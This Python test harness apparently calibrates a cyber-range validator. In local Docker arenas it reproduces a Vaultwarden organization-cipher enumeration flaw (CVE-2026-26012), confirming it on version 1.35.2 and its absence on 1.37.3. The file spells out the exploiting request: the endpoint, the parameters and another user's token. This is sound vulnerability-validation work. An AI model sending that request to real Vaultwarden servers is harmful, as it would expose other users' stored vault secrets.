#!/usr/bin/env python3
"""Live Vaultwarden calibration: CVE-2026-26012 on the pinned 1.35.2 fixture and
its absence on 1.37.3, both confirmed by the platform's generic HTTP
access-control validator on an isolated Docker-local arena.

No external target is contacted. The seed and credentials are synthetic and
live only inside the arena and the local test database.
"""
from __future__ import annotations

import importlib.util
import json
import uuid
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
AGENT_KEY = "nv06-agent-key"
RUN_ID = uuid.uuid4().hex[:8]
EXPECTED = {
    "1.35.2": ("confirmed", "unauthorized_disclosure"),
    "1.37.3": ("refuted", "access_denied"),
}


def _load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


fixture = _load("verify_nv06_live", Path(__file__).with_name("verify-nv06-live.py"))
builder = _load("vaultwarden_builder",
                ROOT / "cyber-range/fixtures/vaultwarden/build_fixture.py")


def _start_stack():
    fixture.run(*fixture.COMPOSE, "down", "--volumes", "--remove-orphans", check=False)
    fixture.run(*fixture.COMPOSE, "up", "-d", "--build", "postgres", "redis",
                "orchestrator", "worker", "webui", "agent-gateway")
    fixture.wait("/health", lambda data: data.get("status") == "ok")
    fixture.run(*fixture.COMPOSE, "exec", "-T", "orchestrator", "python", "-c",
                "from database import Database; from auth import hash_api_key; "
                "Database().create_api_key(hash_api_key('nv06-agent-key'),"
                "'nv06-agent','agent')")


def _base_image() -> str:
    fixture.run("docker", "pull", "python:3.11.14-alpine")
    return fixture.run("docker", "image", "inspect", "python:3.11.14-alpine",
                       "--format", "{{.Id}}").stdout.strip()


def _run_version(meta: dict, base_id: str) -> dict:
    version = meta["version"]
    tag = version.replace(".", "")
    scenario_id = f"vaultwarden-{tag}-{RUN_ID}"
    scenario = {
        "schema": "nidavellir/v3", "name": f"Vaultwarden {version} calibration",
        "requires": {"provider_class": "container"},
        "network": {"segments": [{"name": "lab"}]},
        "nodes": [
            {"name": "target", "role": "victim", "image": meta["image_id"],
             "segments": ["lab"], "ports": [80]},
            {"name": "attacker", "role": "attacker", "image": base_id,
             "segments": ["lab"], "entrypoint": True, "command": "sleep infinity"}],
        "agents": [{"stance": "attacker", "node": "attacker"}],
        "vulnerabilities": [{
            "id": "vaultwarden-org-enum",
            "title": "Organization cipher enumeration ignores collection access",
            "cwe": "CWE-639", "node": "target", "points": 1,
            "validator": "http_access_control",
            "validation_config": {
                "actor": "B", "owner": "A",
                "actor_headers": {"Authorization": "Bearer " + meta["tokens"]["B"]},
                "owner_headers": {"Authorization": "Bearer " + meta["tokens"]["A"]},
                "action": {"method": "GET",
                           "path": "/api/ciphers/organization-details",
                           "params": {"organizationId": meta["org_id"]}},
                "control": {"method": "GET",
                            "path": "/api/ciphers/" + meta["shared_cipher"]},
                "forbidden_marker": meta["restricted_cipher"],
            }}],
        "lifecycle": {"readiness": {
            "type": "http", "node": "target", "port": 80, "path": "/alive",
            "expected_status": 200, "timeout_seconds": 30, "interval_seconds": 1}},
    }
    fixture.api("POST", "/scenarios", {"id": scenario_id, "spec": scenario})
    arena = fixture.api("POST", "/deploy", {
        "scenario": scenario_id, "instance_id": f"vw-{tag}-{RUN_ID}",
        "provider": "docker-local", "engagement_purpose": "calibration",
        "participant_mode": "agent", "engagement_time_box_seconds": 1800,
    })["instance_id"]
    fixture.ARENAS.append(arena)
    fixture.wait(f"/status/{arena}", lambda data: data.get("status") == "active", 180)
    fixture.bind(arena)
    action = fixture.api("POST", f"/arenas/{arena}/http/request", {
        "node": "target", "method": "GET",
        "path": "/api/ciphers/organization-details",
        "params": {"organizationId": meta["org_id"]},
        "headers": {"Authorization": "Bearer " + meta["tokens"]["B"],
                    "X-Request-ID": "vw" + uuid.uuid4().hex}},
        key=AGENT_KEY)
    finding = fixture.api("POST", f"/arenas/{arena}/findings", {
        "title": "Organization cipher enumeration", "cwe": "CWE-639",
        "node": "target", "transaction_digests": [action["transaction_digest"]]},
        key=AGENT_KEY)
    events = fixture.api("GET", f"/deployments/{arena}/events")["events"]
    payload = next(event["payload"] for event in events if event["type"] == "finding"
                   and event["payload"]["finding_id"] == finding["finding_id"])
    verdict = payload["validation"]
    score = fixture.api("GET", f"/arenas/{arena}/score")
    verdict_data = {
        "arena": arena, "version": version, "image_id": meta["image_id"],
        "org_id": meta["org_id"],
        "action": {"status": action["status"],
                   "transaction_digest": action["transaction_digest"],
                   "marker_in_body": meta["restricted_cipher"] in (action.get("body") or "")},
        "verdict": {key: verdict.get(key) for key in (
            "verdict", "reason_code", "validator_id", "action_digest",
            "observation_digest", "control_digest", "explanation", "evidence")},
        "score": {"value": score["score"]["value"],
                  "confirmed_findings": score.get("confirmed_findings")},
    }
    fixture.api("DELETE", f"/destroy/{arena}", expected=(200, 202))
    fixture.wait(f"/status/{arena}", lambda data: data.get("status") == "destroyed", 60)
    for digest in (verdict.get("observation_digest"), verdict.get("control_digest")):
        if digest:
            fixture.api("GET", f"/arenas/{arena}/validation-evidence/{digest}")
    verdict_data["evidence_after_teardown"] = bool(
        fixture.api("GET", f"/arenas/{arena}/eval-export"))
    fixture.api("DELETE", f"/scenarios/{scenario_id}", expected=(200, 204))
    return verdict_data


def main():
    base_id = _base_image()
    _start_stack()
    results = {}
    try:
        for version in sorted(builder.PINS):
            meta = builder.build(version)
            results[version] = _run_version(meta, base_id)
            expected = EXPECTED[version]
            result = results[version]
            assert result["verdict"]["verdict"] == expected[0], result
            assert result["verdict"]["reason_code"] == expected[1], result
            assert result["verdict"]["validator_id"] == "http_access_control"
            assert result["verdict"]["observation_digest"]
            assert result["verdict"]["control_digest"]
            assert result["action"]["marker_in_body"] is (version == "1.35.2")
            assert result["score"]["value"] == (1.0 if version == "1.35.2" else 0.0)
            assert result["evidence_after_teardown"] is True
            print(f"{version}: {result['verdict']['verdict']} "
                  f"({result['verdict']['reason_code']})", flush=True)
        resources = {arena: fixture.inventory(arena) for arena in fixture.ARENAS}
        assert not any(any(counts.values()) for counts in resources.values()), resources
        evidence = {
            "schema": "nidavellir/vaultwarden-live-evidence/v1",
            "created_at": datetime.now().isoformat(),
            "cve": "CVE-2026-26012",
            "advisory": "GHSA-h265-g7rm-h337",
            "target": "vaultwarden/server",
            "pins": {version: builder.PINS[version] for version in builder.PINS},
            "results": results,
            "final_resources": resources,
        }
        path = ROOT / "docs/verification" / (
            f"vaultwarden-live-{datetime.now():%Y-%m-%d}-{RUN_ID}.json")
        with path.open("x") as handle:
            json.dump(evidence, handle, indent=2, sort_keys=True)
            handle.write("\n")
        print(f"Evidence: {path}")
    finally:
        fixture.cleanup_arenas()
        fixture.run(*fixture.COMPOSE, "down", "--volumes", "--remove-orphans", check=False)
        leftovers = {arena: fixture.inventory(arena) for arena in fixture.ARENAS}
        if any(any(counts.values()) for counts in leftovers.values()):
            raise RuntimeError(f"cleanup left labelled resources: {leftovers}")


if __name__ == "__main__":
    main()
